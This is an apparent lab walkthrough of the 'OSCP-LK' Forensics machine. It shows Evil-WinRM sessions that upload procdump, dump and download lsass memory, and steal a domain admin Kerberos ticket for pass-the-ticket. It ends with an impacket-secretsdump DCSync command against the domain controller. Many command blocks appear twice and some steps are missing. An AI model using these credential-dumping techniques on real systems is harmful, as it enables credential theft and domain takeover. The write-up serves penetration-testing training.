Forensics

Forensics

Objective

This lab is a hosted version of the OSCP-LK set. OSCP-LK is a set of machines in the style of the PEN 200 labs and exam to help you sharpen your enumeration, creative thinking and exploitation techniques. The machines were designed to be truly "OSCP like" even more than some machines in OSCP like lists.
This lab is a hosted version of the OSCP-LK set. OSCP-LK is a set of machines in the style of the PEN 200 labs and exam to help you sharpen your enumeration, creative thinking and exploitation techniques. The machines were designed to be truly "OSCP like" even more than some machines in OSCP like lists.

Assessment

Since the three IP addresses have been provided to us, I added them to a file called ips.txt on my machine:

10.0.28.19

As shown in the output above, the domain name is LAINOSCP.local and all three hosts are running Windows.

I added the following entries inside my /etc/hosts file:

10.0.28.19       DC01.LAINOSCP.local LAINOSCP.local DC01
10.0.29.69       FORENSICS01.LAINOSCP.LOCAL         FORENSICS01
10.0.22.233      WS01.LAINOSCP.LOCAL                WS01
10.0.28.19       DC01.LAINOSCP.local LAINOSCP.local DC01
10.0.29.69       FORENSICS01.LAINOSCP.LOCAL         FORENSICS01
10.0.22.233      WS01.LAINOSCP.LOCAL                WS01

Highly privileged accounts are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. I can abuse this privilege to dump the credentials from the lsass process, but a reverse shell can also be obtained.

I downloaded a copy of the procdump64.exe binary. Then I uploaded the file to the C:\Temp directory on the FORENSICS01 host:

*Evil-WinRM* PS C:\Users\erika\Documents> cd C:\Temp
*Evil-WinRM* PS C:\Temp> upload procdump64.exe

Uploading this dump file to my machine took a while. We can dump the contents of the dump file using mimikatz, but that involves in transferring mimikatz to the FORENSICS01 host. Or we can transfer the dump file to our machine and use pypykatz to extract credentials. I opted in for the second option:

*Evil-WinRM* PS C:\Temp> download lsass.dmp
                                        
Info: Downloading C:\Temp\lsass.dmp to lsass.dmp
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Temp> download lsass.dmp
                                        
Info: Downloading C:\Temp\lsass.dmp to lsass.dmp
                                        
Info: Download successful!

Reading the notes.txt file returns the following:

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd iocs
*Evil-WinRM* PS C:\Users\Administrator\Documents\iocs> more notes.txt
-Attackers where able to deliver cobaltstrike beacons and achieve foothold
-They compromised a machine where domain admin was logged in and extracted it's ticket
-SOC team was able to detect the attack due to the attackers writting the ticket to disk
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd iocs
*Evil-WinRM* PS C:\Users\Administrator\Documents\iocs> more notes.txt
-Attackers where able to deliver cobaltstrike beacons and achieve foothold
-They compromised a machine where domain admin was logged in and extracted it's ticket
-SOC team was able to detect the attack due to the attackers writting the ticket to disk

Since the kirbi is a ticket file. I can use pass-the-ticket technique to gain the privileges of the domain administrator. Firstly, I downloaded the administrator.kirbi to my machine:

*Evil-WinRM* PS C:\Users\Administrator\Documents\iocs> download administrator.kirbi
                                        
Info: Downloading C:\Users\Administrator\Documents\iocs\administrator.kirbi to administrator.kirbi
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\Administrator\Documents\iocs> download administrator.kirbi
                                        
Info: Downloading C:\Users\Administrator\Documents\iocs\administrator.kirbi to administrator.kirbi
                                        
Info: Download successful!

Using this ticketConverter.py tool, I converted the administrator.kirbi to ccache file which I can use from my attack machine:

┌──(kali㉿kali)-[~/Desktop/Labs/Forensics]
└─$ ticketConverter.py administrator.kirbi admin.ccache

┌──(kali㉿kali)-[~/Desktop/Labs/Forensics]
└─$ ticketConverter.py administrator.kirbi admin.ccache

[+] done

The tool will successfully create a ccache file. Then using the created ccache file, I used it to gain a shell on the domain controller to move laterally:

However, the end goal of the assessment is to retrieve the NT hash of the domain administrator. I achieved this by just performing a DCSync attack to recover the NT hash:

┌──(kali㉿kali)-[~/Desktop/Labs/Forensics]
└─$ KRB5CCNAME=admin.ccache impacket-secretsdump lainoscp.local/Administrator@DC01.lainoscp.local -k -no-pass -dc-ip 10.0.28.19 -just-dc-user Administrator
